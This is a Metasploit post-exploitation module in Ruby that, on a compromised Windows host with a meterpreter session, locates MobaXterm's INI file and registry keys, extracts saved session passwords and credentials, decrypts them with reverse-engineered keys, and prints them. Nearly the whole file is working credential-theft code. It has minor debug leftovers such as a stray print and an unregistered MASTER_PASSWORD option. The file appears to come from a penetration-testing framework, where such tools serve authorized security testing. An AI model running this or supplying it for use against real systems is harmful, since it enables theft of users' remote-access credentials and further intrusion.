##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows MobaXterm Session Information Enumeration',
        'Description' => %q{
          This module will determine if MobaXterm is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible, using the decryption information that HyperSine reverse engineered.

          Note that whilst MobaXterm has installers for Linux, Mac and Windows, this module presently only works on Windows.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://github.com/HyperSine/how-does-MobaXterm-encrypt-password/blob/master/doc/how-does-MobaXterm-encrypt-password.md']
        ],
        'Author' => [
          'HyperSine', # Original author of the MobaXterm session decryption script and one who found the encryption keys.
          'Kali-Team <kali-team[at]qq.com>' # Metasploit module
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('PASSPHRASE', [ false, 'The configuration password that was set when MobaXterm was installed, if one was supplied']),
        OptString.new('SESSION_PATH', [ false, 'Specifies the session directory path for MobaXterm']),
      ]
    )
  end

  def key_crafter(config)
    if (!config['SessionP'].empty? && !config['SessionP'].nil?)
      s1 = config['SessionP']
      s1 += s1 while s1.length < 20
      key_space = [s1.upcase, s1.upcase, s1.downcase, s1.downcase]
      key = '0d5e9n1348/U2+67'.bytes
      for i in (0..key.length - 1)
        b = key_space[(i + 1) % key_space.length].bytes[i]
        if !key.include?(b) && '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/'.include?(b)
          key[i] = b
        end
      end
      return key
    end
  end

  def mobaxterm_decrypt(ciphertext, key)
    ct = ''.bytes
    ciphertext.each_byte do |c|
      ct << c if key.include?(c)
    end
    if ct.length.even?
      pt = ''.bytes
      (0..ct.length - 1).step(2) do |i|
        l = key.index(ct[i])
        key = key[0..-2].insert(0, key[-1])
        h = key.index(ct[i + 1])
        key = key[0..-2].insert(0, key[-1])
        next if (l == -1 || h == -1)

        pt << (16 * h + l)
      end
      p pt.pack('c*')
    end
  end

  def mobaxterm_crypto_safe(ciphertext)
    return nil if ciphertext.nil? || ciphertext.empty?

    iv = ("\x00" * 16)
    master_password = datastore['MASTER_PASSWORD'] || '1111111'
    key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]
    aes = OpenSSL::Cipher.new('AES-256-ECB').encrypt
    aes.key = key
    new_iv = aes.update(iv)
    # segment_size = 8
    new_aes = OpenSSL::Cipher.new('AES-256-CFB8').decrypt
    new_aes.key = key
    new_aes.iv = new_iv
    aes.padding = 0
    padded_plain_bytes = new_aes.update(Rex::Text.decode_base64(ciphertext))
    padded_plain_bytes << new_aes.final
    return padded_plain_bytes
  end

  def mobaxterm_store_config(config)
    if config[:hostname].to_s.empty? || config[:service_name].to_s.empty? || config[:port].to_s.empty? || config[:username].to_s.empty? || config[:password].nil?
      return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),
      # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually
      # use against a target.
    end

    service_data = {
      address: config[:hostname],
      port: config[:port],
      service_name: config[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username],
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)
    create_credential_and_login(credential_data)
  end

  def gather_password(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\P"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = registry_getvaldata(parent_key, connect)
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    else
      config['Passwords'].each_key do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = config['Passwords'][connect]
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    end
    result
  end

  def gather_creads(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\C"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |name|
        username, password = registry_getvaldata(parent_key, name).split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    else
      config['Credentials'].each_key do |name|
        username, password = config['Credentials'][name].split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    end

    result
  end

  def parser_ini(ini_config_path)
    valuable_info = {}
    if session.fs.file.exist?(ini_config_path)
      file_contents = read_file(ini_config_path)
      if file_contents.nil? || file_contents.empty?
        print_warning('Configuration file content is empty')
        return
      else
        config = Rex::Parser::Ini.from_s(file_contents)
        valuable_info['PasswordsInRegistry'] = config['Misc']['PasswordsInRegistry'] || '0'
        valuable_info['SessionP'] = config['Misc']['SessionP'] || 0
        valuable_info['Sesspass'] = config['Sesspass'] || nil
        valuable_info['Passwords'] = config['Passwords'] || {}
        valuable_info['Credentials'] = config['Credentials'] || {}
        # valuable_info['Bookmarks'] = config['Bookmarks'] || nil
        return valuable_info
      end
    else
      print_warning('Could not find the config path for the MobaXterm. Ensure that MobaXterm is installed on the target.')
      return false
    end
  end

  def run
    print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
    session_p = 0
    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      # require 'pry';binding.pry
      ini_config_path = "#{user['MyDocs']}\\MobaXterm\\MobaXterm.ini"
      config = parser_ini(ini_config_path)
      next if !config

      # mobaxterm_crypto_safe("x2I5bw==")
      parent_key = "HKEY_USERS\\#{user['SID']}\\Software\\Mobatek\\MobaXterm"
      config['RegistryKey'] = parent_key
      session_p = registry_getvaldata(parent_key, 'SessionP') if registry_key_exist?(parent_key)
      pws_result = gather_password(config)
      print_good(pws_result.to_s)
      print_status('-' * 20)
      creds_result = gather_creads(config)
      print_good(creds_result.to_s)
    end
  end
end
